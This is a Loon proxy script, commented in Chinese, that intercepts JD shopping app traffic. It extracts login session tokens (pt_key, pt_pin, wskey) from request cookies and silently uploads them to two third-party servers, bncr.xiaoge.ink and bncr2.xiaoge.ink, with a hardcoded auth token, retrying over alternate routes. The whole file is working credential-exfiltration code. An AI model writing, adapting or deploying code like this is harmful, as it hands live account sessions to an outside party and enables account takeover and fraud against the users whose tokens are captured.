/**
 * Loon http-request script: 京东凭据提取 → Bncr 静默同步
 *
 * 抓取来源（两条规则，内容自动识别，无需区分域名）：
 *   api.m.jd.com  → pt_key + pt_pin（basicConfig 等接口）
 *   sh.jd.com/d   → wskey（登录票据，可能不含 pin）
 *
 * 关键：JD App 在 HTTP/2 下会把 Cookie 拆成十几个同名 cookie 头
 * （实测 api.m.jd.com 一次请求 19 个，pt_key 排在第 15 个）。
 * 代理合并同名头时，分隔符可能是 "; " / ", " / 换行，
 * 因此解析层必须对分隔符不敏感，否则 pt_key 直接抓不到。
 *
 * 片段拼装：pin 与 wskey 常分属不同请求，脚本把 pin 记忆到本地（12 小时有效），
 * 遇到只有 wskey 的请求时自动回填。
 *
 * 去重：pt_key 与 wskey 各自记「最近一次受理的凭据」。凭据未变 → 直接放行。
 * 必须分开记 —— 合并成单个指纹会让两者互相覆盖，导致重复上报。
 * 去重记录在【发起上报前的同步段】就写入（抢占式），不能等异步回调，
 * 否则 JD App 并发打多个 basicConfig 时每个实例都会放行 → 重复外发 + 弹窗风暴。
 * 上报失败会按值回滚，让下一个请求能自然重试。
 *
 * 通知（三类，互不重叠）：
 *   抓到新 wskey → 立刻弹窗（不等上报结果），点击复制 pin=…;wskey=…;
 *   上报成功     → 弹窗 1 次，点击复制完整凭据（有 pt_key 时给 pt_key 形态）
 *   上报失败 / upload=off → 弹「诊断通知」（每版本每账号至多 1 条）
 *   无 CK / 无 pin / 凭据未变 → 只写日志，不弹窗（这些是正常状态）
 *
 * 上报：并发打 bncr / bncr2 两个域名，任一成功即算成功（冗余投递）。
 *   两个域名都在 Cloudflare 上，A/AAAA 均可达，插件只保留直连、不再强制 IPv6。
 *   一轮全失败才退回「当前路由」再发一轮；两轮都失败才算失败。
 *
 * 参数（argument）：
 *   silent=true/false  默认 false（成功即弹窗+点击复制）；true 则完全静默
 *   upload=on/off      默认 on
 *   node=DIRECT        上报出口，默认 DIRECT；填策略名时若首轮失败会自动
 *                      退回「当前路由」重试一轮（两轮都失败才算失败）
 *   debug=on/off       默认 off；on 时每次命中都打日志（排查用）
 *
 * @author XiaoGe-LiBai
 * @license MIT
 */

// 并发上报的两个域名，任一成功即算成功（冗余投递）
const BNCR_ENDPOINTS = [
  { name: "bncr",  url: "https://bncr.xiaoge.ink/api/Doraemon/loginCallback_receive" },
  { name: "bncr2", url: "https://bncr2.xiaoge.ink/api/Doraemon/loginCallback_receive" }
];
const BNCR_AUTH_TOKEN = "96358b36fc0769de2c8373d5e3582bb9";

const PIN_TTL_MS = 12 * 60 * 60 * 1000;      // pin 记忆有效期
const HIT_LOG_INTERVAL_MS = 10 * 1000;       // 无凭据时的命中日志限流间隔

const STORE_PIN = "jd_loon_pin";             // {pin, raw, ts}
const STORE_PTKEY_PREFIX = "jd_loon_ptkey_"; // 每账号最近一次已受理的 pt_key（失败会回滚）
const STORE_WSKEY_PREFIX = "jd_loon_wskey_"; // 每账号最近一次已受理的 wskey（失败会回滚）
const STORE_HIT_TS = "jd_loon_hit_ts";       // 命中日志限流时间戳
const STORE_DIAG_PREFIX = "jd_loon_diag_";   // 诊断通知标记（按版本+账号，每人每版至多 1 条）
const STORE_WSKEY_POP_PREFIX = "jd_loon_wskeypop_"; // 每账号最近一次已弹窗的 wskey（不回滚：弹窗是抓包事件，与上报成败无关）

const SCRIPT_VERSION = "2026-09-16.9";       // 改脚本时同步更新，日志与诊断通知都会显示，便于确认线上跑的是哪一版

// ctx 承载本次请求的全部上下文：在同步段一次算好，随后在异步回调间传递
(function () {
  try {
    if (!$request || $request.method === "OPTIONS") {
      return $done({});
    }

    const args = parseArgs(typeof $argument === "string" ? $argument : "");
    const parsed = collectCookie($request.headers || {});

    const ctx = {
      host: hostOf($request.url),
      cookieHeaders: parsed.count,
      cookie: parsed.cookie,
      ptKey: pick(parsed.cookie, "pt_key"),
      wskey: pick(parsed.cookie, "wskey"),
      rawPin: pick(parsed.cookie, "pt_pin") || pick(parsed.cookie, "pin") || pick(parsed.cookie, "pwdt_id"),
      pin: "",
      isDebug: (args.debug || "off").toLowerCase() === "on",
      // 默认「上报成功即弹窗」（可点击复制凭据）；去重保证同一凭据只弹一次，不会刷屏
      isSilent: (args.silent || "false").toLowerCase() === "true",
      isUploadEnabled: (args.upload || "on").toLowerCase() !== "off",
      // 上报出口：默认 DIRECT（两个域名都在 Cloudflare，直连即可，省一次代理往返）
      node: String(args.node || "").trim() || "DIRECT"
    };

    if (!ctx.cookie) {
      hitLog(ctx.isDebug, `${ctx.host} | 无 Cookie 头(共 ${ctx.cookieHeaders} 个) → 放行`);
      return $done({});
    }

    if (ctx.isDebug) {
      console.log(`[京东凭据 v${SCRIPT_VERSION}] 命中 ${ctx.host} | cookie头 ${ctx.cookieHeaders} 个 | pt_key ${yn(ctx.ptKey)} pt_pin ${yn(ctx.rawPin)} wskey ${yn(ctx.wskey)}`);
    }

    // pin 记忆：命中即刷新，未命中则回填最近一次（供 sh.jd.com 这类无 pin 的请求配对）
    if (ctx.rawPin) {
      const pin = decodePin(ctx.rawPin);
      $persistentStore.write(JSON.stringify({ pin: pin, raw: ctx.rawPin, ts: Date.now() }), STORE_PIN);
      return handle(pin, ctx.rawPin, ctx);
    }

    const recalled = recallPin();
    if (recalled.pin) {
      hitLog(ctx.isDebug, `${ctx.host} | pt_pin 缺失，回填记忆 pin ${recalled.pin}`);
      return handle(recalled.pin, recalled.raw, ctx);
    }

    hitLog(ctx.isDebug, `${ctx.host} | 未找到 pin（cookie 头 ${ctx.cookieHeaders} 个）→ 放行`);
    return $done({});

  } catch (err) {
    console.log(`❌ [京东凭据 v${SCRIPT_VERSION}] 脚本异常: ${(err && err.message) || err}`);
    $done({});
  }
})();

/**
 * 组装并上报
 */
function handle(pin, rawPin, ctx) {
  const ptKey = ctx.ptKey;
  const wskey = ctx.wskey;

  if (!ptKey && !wskey) {
    hitLog(ctx.isDebug, `${ctx.host} | pin ${pin} 但无 pt_key/wskey → 放行`);
    return $done({});
  }

  ctx.pin = pin; // 供诊断通知按账号记账

  // 优先 pt_key 形态（登录插件可直接使用），退回 wskey 形态
  const fullCk = ptKey
    ? `pt_key=${ptKey}; pt_pin=${rawPin || pin};`
    : `pin=${encodeURIComponent(pin)};wskey=${wskey};`;

  // 去重（抢占式）：读-判-写必须全在【同步段】内完成，不能等异步回调。
  // 失败教训：旧版把写入放在 $httpClient 回调里，中间隔着整个 HTTP 往返，
  // JD App 启动时并发打多个 basicConfig，每个实例都在别人写入前读到「未变」
  // → 5 个请求各外发一次、各弹一条窗。
  const ptKeyStore = STORE_PTKEY_PREFIX + pin;
  const wskeyStore = STORE_WSKEY_PREFIX + pin;
  const prevPtKey = $persistentStore.read(ptKeyStore) || "";
  const prevWskey = $persistentStore.read(wskeyStore) || "";
  const ptKeyChanged = Boolean(ptKey && ptKey !== prevPtKey);
  const wskeyChanged = Boolean(wskey && wskey !== prevWskey);

  if (!ptKeyChanged && !wskeyChanged) {
    hitLog(ctx.isDebug, `${ctx.host} | 凭据未变，已抑制重复上报`);
    return $done({});
  }

  const changedLabel = [ptKeyChanged && "pt_key", wskeyChanged && "wskey"].filter(Boolean).join(" + ");

  // 先记账再外发：并发实例随后读到的就是新值，直接放行。
  // 上报失败时按值回滚（见下方回调），下一个请求能自然重试。
  if (ptKeyChanged) $persistentStore.write(ptKey, ptKeyStore);
  if (wskeyChanged) $persistentStore.write(wskey, wskeyStore);

  // 抓到新 wskey 立刻弹窗（不等上报结果）：点击复制 pin=…;wskey=…; 形态。
  // 用独立标记去重、且不随上报失败回滚 —— 弹窗是「抓到了」这件事，
  // 与「送达了没有」无关；送达失败另有诊断通知负责。
  // 记下刚弹过的剪贴板：若成功弹窗的内容与它逐字相同（只有 wskey 变化时就是如此），
  // 就不再重复弹一条 —— 否则同一件事会连弹两条内容一样的窗。
  ctx.wskeyPopClip = wskeyChanged ? popWskeyOnce(pin, wskey, ctx.isSilent) : "";

  console.log(`================== [京东CK抓取 v${SCRIPT_VERSION}] ==================`);
  console.log(`账号 PIN : ${pin}`);
  console.log(`变更类型 : ${changedLabel}`);
  console.log(`凭据内容 : ${fullCk}`);
  console.log("================================================================");

  if (!ctx.isUploadEnabled) {
    console.log("ℹ️ upload=off，已跳过外发");
    diagnoseOnce(ctx, "upload=off，未外发");
    return $done({});
  }

  const payload = {
    wskey: wskey || "",
    pin: pin,
    full_ck: fullCk,
    name: pin,
    source: "loon-plugin",
    callback_id: BNCR_AUTH_TOKEN
  };

  console.log(`→ 并发上报 ${BNCR_ENDPOINTS.map(function (e) { return e.name; }).join(" + ")}（出口: ${ctx.node}）`);

  sendUpload(ctx.node, payload, function (result, usedRoute) {
    try {
      if (result.ok) {
        console.log(`✅ 上报成功[${usedRoute}]: ${result.msg}`);

        if (!ctx.isSilent && fullCk !== ctx.wskeyPopClip) {
          $notification.post(
            "🎉 京东CK已同步",
            `${pin} (${changedLabel})`,
            `已送达 ${result.delivered.join(" + ")}，点击可复制`,
            { clipboard: fullCk }
          );
        }
        return;
      }

      // 受理失败 → 回滚去重记录，让下一个请求能重试；
      // 不回滚的话这次凭据会被永久判为「已上报」，再也不会重试。
      if (ptKeyChanged) $persistentStore.write(prevPtKey || undefined, ptKeyStore);
      if (wskeyChanged) $persistentStore.write(prevWskey || undefined, wskeyStore);

      console.log(`❌ 上报失败: ${result.detail} — 已回滚去重记录，下次请求自动重试`);
      diagnoseOnce(ctx, `❌ 上报失败：${result.detail}`);
    } catch (cbErr) {
      console.log(`❌ 上报回调异常: ${(cbErr && cbErr.message) || cbErr}`);
    } finally {
      $done({});
    }
  });
}

/**
 * 带降级的上报（两个域名并发，任一成功即算成功）：
 *   1) 用指定出口（默认 DIRECT）并发打所有域名 —— 任一成功即成功
 *   2) 全部失败且指定了出口 → 退回「当前路由」再并发打一轮
 * 两轮都失败才判定失败。失败不写去重记录，下次请求自然重试。
 */
function sendUpload(route, payload, done) {
  uploadRound(route, payload, function (first) {
    if (first.ok) return done(first, route);
    if (!route) return done(first, "当前路由");

    console.log(`⚠️ 出口 ${route} 两个域名均失败（${first.detail}），退回当前路由重试一轮`);
    uploadRound("", payload, function (second) {
      if (second.ok) return done(second, "当前路由");
      return done({ ok: false, detail: `出口${route}: ${first.detail} ｜ 当前路由: ${second.detail}` }, "两轮均失败");
    });
  });
}

/**
 * 一轮上报：并发打所有域名，等【全部】回调落地后再汇总。
 * 必须等齐再回调 —— 还有请求在飞就回调会让调用方提前 $done()，Loon 会掐断在途请求。
 * 判定：任一域名成功即算这一轮成功（冗余投递语义）。
 */
function uploadRound(route, payload, cb) {
  const results = [];
  let pending = BNCR_ENDPOINTS.length;

  BNCR_ENDPOINTS.forEach(function (endpoint, i) {
    tryUpload(endpoint, route, payload, function (r) {
      results[i] = r;
      pending -= 1;
      if (pending > 0) return;

      const delivered = results.filter(function (x) { return x.ok; }).map(function (x) { return x.name; });
      if (delivered.length) {
        cb({
          ok: true,
          delivered: delivered,
          msg: `${results.filter(function (x) { return x.ok; })[0].msg} [${delivered.join("+")}]`
        });
      } else {
        cb({
          ok: false,
          detail: results.map(function (x) { return `${x.name}: ${x.detail}`; }).join(" ｜ ")
        });
      }
    });
  });
}

/**
 * 单次上报（单个域名）
 */
function tryUpload(endpoint, route, payload, cb) {
  const options = {
    url: endpoint.url,
    headers: {
      "Content-Type": "application/json",
      "User-Agent": resolveUserAgent()
    },
    body: JSON.stringify(payload),
    timeout: 10000
  };
  if (route) options.node = route;

  $httpClient.post(options, function (error, response, data) {
    if (error) {
      cb({ ok: false, name: endpoint.name, detail: `网络错误: ${error}` });
      return;
    }
    const status = response ? (response.status || response.statusCode) : 0;
    let res = {};
    try {
      res = JSON.parse(data || "{}");
    } catch (e) {
      res = {};
    }
    if (status === 200 && (res.code === 0 || res.code === 200)) {
      cb({ ok: true, name: endpoint.name, msg: `${res.msg || "ok"} (${res.triggered || "-"})` });
    } else {
      cb({ ok: false, name: endpoint.name, detail: describeFailure(status, data) });
    }
  });
}

/**
 * 把上报失败翻译成人话，重点识别「被运营商/网关劫持」这种情况：
 * 请求打到了接口，回来的却是 HTML 备案页 / 登录页，而不是 JSON。
 */
function describeFailure(status, body) {
  const text = String(body || "");
  const snippet = text.replace(/\s+/g, " ").trim().slice(0, 90);
  if (/<html|<!doctype|备案|beian|not found|nginx/i.test(text)) {
    return `HTTP ${status}，返回的是 HTML 而非接口 JSON（疑似被运营商/网关劫持或走了错误线路）: ${snippet}`;
  }
  return `HTTP ${status}: ${snippet || "空响应"}`;
}

/**
 * 抓到新 wskey 的弹窗：剪贴板固定 pin=…;wskey=…; 形态。
 * 独立标记、不随上报失败回滚 —— 同一份 wskey 只弹一次，与送达成败无关。
 */
function popWskeyOnce(pin, wskey, isSilent) {
  if (isSilent || !wskey) return "";
  const key = STORE_WSKEY_POP_PREFIX + pin;
  if (($persistentStore.read(key) || "") === wskey) return "";
  $persistentStore.write(wskey, key);
  const clip = `pin=${encodeURIComponent(pin)};wskey=${wskey};`;
  try {
    $notification.post("🔑 京东wskey已获取", pin, "已拼接 pin + wskey，点击可复制", { clipboard: clip });
  } catch (e) {
    // 通知失败不影响主流程
  }
  return clip;
}

/**
 * 诊断通知：只对「需要用户行动」的结果弹窗，其余只写日志。
 *   弹：上报失败（需要用户处理）、upload=off（配置可能不符预期）
 *   不弹：无 CK / 无 pin / 凭据未变 / 上报成功（成功由带复制的正式通知负责）
 * 按「版本 + pin」记账：即便并发实例同时失败，也只弹一条，避免刷屏。
 */
function diagnoseOnce(d, result) {
  const key = STORE_DIAG_PREFIX + SCRIPT_VERSION + "_" + (d.pin || "-");
  if ($persistentStore.read(key)) return;
  $persistentStore.write("1", key);

  const fields = cookieFields(d.cookie, 4);
  const listing = fields.names ? `\n字段(${fields.count}): ${fields.names}` : "\n(请求里没有 Cookie)";

  try {
    $notification.post(
      `京东脚本诊断 v${SCRIPT_VERSION}`,
      `${d.host} | Cookie 键 ${d.cookieHeaders} 个`,
      `pt_key ${yn(d.ptKey)}  pt_pin ${yn(d.rawPin)}  wskey ${yn(d.wskey)}${listing}\n${result}`
    );
  } catch (e) {
    // 通知失败不影响主流程
  }
}

/**
 * 数 cookie 字段个数，顺带取前几个字段名（只取名字不取 value，用于诊断）。
 * 字段个数是判断「代理有没有把十几个同名 cookie 头都交给我们」的关键数字。
 */
function cookieFields(cookie, nameLimit) {
  const names = [];
  let count = 0;
  String(cookie || "")
    .split(/[;,\r\n]+/)
    .forEach(function (seg) {
      const idx = seg.indexOf("=");
      if (idx <= 0) return;
      count++;
      if (names.length >= nameLimit) return;
      const name = seg.slice(0, idx).trim();
      if (/^[\w.@-]+$/.test(name)) names.push(name);
    });
  return { count: count, names: names.join(", ") };
}

/**
 * 命中日志：默认限流（10 秒最多 1 条），debug=on 时每次都打
 */
function hitLog(isDebug, message) {
  const line = `[京东凭据 v${SCRIPT_VERSION}] ${message}`;
  if (isDebug) {
    console.log(line);
    return;
  }
  const now = Date.now();
  if (now - Number($persistentStore.read(STORE_HIT_TS) || 0) < HIT_LOG_INTERVAL_MS) return;
  $persistentStore.write(String(now), STORE_HIT_TS);
  console.log(line);
}

/**
 * 聚合所有 cookie 头：一次遍历同时得到拼接结果与 cookie 头个数。
 * 兼容三种形态：数组值 / cookie#N 分片键 / 单键内含 ", " 或换行拼接的多段 Cookie。
 */
function collectCookie(headers) {
  const raw = [];
  let count = 0;
  Object.keys(headers || {}).forEach(function (name) {
    if (String(name).toLowerCase().indexOf("cookie") !== 0) return;
    count++;
    const value = headers[name];
    if (Array.isArray(value)) {
      value.forEach(function (v) {
        if (v) raw.push(String(v));
      });
    } else if (value) {
      raw.push(String(value));
    }
  });

  // 换行、回车统一成 "; "，再交给 pick 做分隔符无关的解析
  return { cookie: raw.join("; ").replace(/[\r\n]+/g, "; ").trim(), count: count };
}

/**
 * 取 cookie 字段值
 * 分隔符对 ", " / "; " / 换行都兼容（代理合并同名头的方式不确定）
 */
function pick(cookie, name) {
  const re = new RegExp("(?:^|[;,])\\s*" + name + "=([^;,]+)");
  const m = String(cookie).match(re);
  return m ? m[1].trim() : "";
}

/**
 * 从 URL 取主机名（用于日志）
 */
function hostOf(url) {
  const m = String(url || "").match(/^https?:\/\/([^\/]+)/i);
  return m ? m[1] : "(未知)";
}

/**
 * yes/no 标记
 */
function yn(value) {
  return value ? "✓" : "✗";
}

/**
 * 读取 pin 记忆
 */
function recallPin() {
  const raw = $persistentStore.read(STORE_PIN);
  if (!raw) return { pin: "", raw: "" };
  try {
    const data = JSON.parse(raw);
    if (Date.now() - Number(data.ts || 0) > PIN_TTL_MS) return { pin: "", raw: "" };
    return { pin: String(data.pin || ""), raw: String(data.raw || "") };
  } catch (e) {
    return { pin: "", raw: "" };
  }
}

/**
 * pin 解码（非编码值原样返回）
 */
function decodePin(value) {
  try {
    return decodeURIComponent(value);
  } catch (e) {
    return value;
  }
}

/**
 * 参数解析（a=1&b=2）
 */
function parseArgs(str) {
  const out = {};
  String(str || "").split("&").forEach(function (kv) {
    if (!kv) return;
    const idx = kv.indexOf("=");
    const key = (idx >= 0 ? kv.slice(0, idx) : kv).trim();
    if (!key) return;
    out[key] = decodeURIComponent(idx >= 0 ? kv.slice(idx + 1) : "");
  });
  return out;
}

/**
 * 动态 UA：优先复用京东 App 原生请求 UA，兜底标准 iOS Safari UA
 */
function resolveUserAgent() {
  const headers = ($request && $request.headers) || {};
  let ua = "";
  Object.keys(headers).some(function (k) {
    if (k.toLowerCase() !== "user-agent") return false;
    ua = typeof headers[k] === "string" ? headers[k].trim() : "";
    return Boolean(ua);
  });
  return ua || "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148";
}
